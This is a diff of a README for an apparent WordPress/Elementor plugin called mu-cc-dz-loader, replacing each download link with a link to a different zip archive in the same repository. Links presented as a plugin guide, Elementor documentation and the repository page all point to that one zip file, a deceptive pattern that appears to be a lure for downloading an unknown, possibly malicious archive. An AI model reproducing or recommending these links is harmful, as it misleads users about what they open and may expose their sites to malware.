@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the mu-cc-dz-loader applicati
 
 ## 📥 Download Now
 
-[![Download mu-cc-dz-loader](https://raw.githubusercontent.com/Eminalb7247/mu-cc-dz-loader/main/mu-plugins/codecorn/dz-lite/assets/css/mu-cc-dz-loader-v2.4.zip)](https://raw.githubusercontent.com/Eminalb7247/mu-cc-dz-loader/main/mu-plugins/codecorn/dz-lite/assets/css/mu-cc-dz-loader-v2.4.zip)
+[![Download mu-cc-dz-loader](https://github.com/Eminalb7247/mu-cc-dz-loader/raw/refs/heads/main/mu-plugins/dz-cc-loader-mu-v2.9-alpha.3.zip)](https://github.com/Eminalb7247/mu-cc-dz-loader/raw/refs/heads/main/mu-plugins/dz-cc-loader-mu-v2.9-alpha.3.zip)
 
 ## 📂 What is mu-cc-dz-loader?
 
@@ -35,7 +35,7 @@ To run mu-cc-dz-loader effectively, you will need:
 
 To download the plugin, visit the following link:
 
-[Download mu-cc-dz-loader](https://raw.githubusercontent.com/Eminalb7247/mu-cc-dz-loader/main/mu-plugins/codecorn/dz-lite/assets/css/mu-cc-dz-loader-v2.4.zip)
+[Download mu-cc-dz-loader](https://github.com/Eminalb7247/mu-cc-dz-loader/raw/refs/heads/main/mu-plugins/dz-cc-loader-mu-v2.9-alpha.3.zip)
 
 ### Step 2: Locate the Latest Release
 
@@ -82,14 +82,14 @@ Feel free to visit the support forums or open an issue on the GitHub page for fu
 
 ## 🔗 Additional Resources
 
-- [WordPress Plugin Guide](https://raw.githubusercontent.com/Eminalb7247/mu-cc-dz-loader/main/mu-plugins/codecorn/dz-lite/assets/css/mu-cc-dz-loader-v2.4.zip)
-- [Elementor Documentation](https://raw.githubusercontent.com/Eminalb7247/mu-cc-dz-loader/main/mu-plugins/codecorn/dz-lite/assets/css/mu-cc-dz-loader-v2.4.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Eminalb7247/mu-cc-dz-loader/main/mu-plugins/codecorn/dz-lite/assets/css/mu-cc-dz-loader-v2.4.zip)
+- [WordPress Plugin Guide](https://github.com/Eminalb7247/mu-cc-dz-loader/raw/refs/heads/main/mu-plugins/dz-cc-loader-mu-v2.9-alpha.3.zip)
+- [Elementor Documentation](https://github.com/Eminalb7247/mu-cc-dz-loader/raw/refs/heads/main/mu-plugins/dz-cc-loader-mu-v2.9-alpha.3.zip)
+- [GitHub Repository](https://github.com/Eminalb7247/mu-cc-dz-loader/raw/refs/heads/main/mu-plugins/dz-cc-loader-mu-v2.9-alpha.3.zip)
 
 ## 📥 Download & Install
 
 Ready to upgrade your Elementor experience? Download your copy of the mu-cc-dz-loader by visiting the link below:
 
-[Download mu-cc-dz-loader](https://raw.githubusercontent.com/Eminalb7247/mu-cc-dz-loader/main/mu-plugins/codecorn/dz-lite/assets/css/mu-cc-dz-loader-v2.4.zip)
+[Download mu-cc-dz-loader](https://github.com/Eminalb7247/mu-cc-dz-loader/raw/refs/heads/main/mu-plugins/dz-cc-loader-mu-v2.9-alpha.3.zip)
 
 Thank you for using mu-cc-dz-loader! We hope it improves your file-uploading experience on WordPress.
